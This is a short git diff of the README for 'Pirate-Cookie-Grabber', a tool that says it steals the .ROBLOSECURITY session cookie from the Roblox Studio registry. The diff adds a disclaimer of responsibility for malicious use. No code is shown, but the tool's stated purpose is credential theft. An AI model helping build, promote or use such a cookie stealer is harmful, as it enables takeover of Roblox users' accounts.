@@ -1,4 +1,7 @@
 # Pirate-Cookie-Grabber
+
+**I Am not responsible for any malicious use of this program**
+
 Pirate Stealer steals .ROBLOSECURITY cookie from Roblox Studio Registry
 # Feautres
 	🔴 Crashes when cookie inside registry is not valid
